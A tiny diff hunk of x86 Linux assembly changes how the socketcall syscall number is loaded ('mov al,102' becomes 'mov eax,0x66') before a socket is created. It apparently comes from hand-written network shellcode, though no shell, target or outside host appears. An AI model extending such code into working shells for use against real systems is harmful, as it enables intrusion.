@@ -26,7 +26,7 @@ _start :
 ;   mov edi,ecx
 
 ;Socket
-	mov al,102 ; syscall - socketcall
+	mov eax,0x66 ; syscall - socketcall
 	mov bl, SYS_SOCKET ; type sys_socket
 	; socket(domain,type,protocol)
 	xor edx,edx
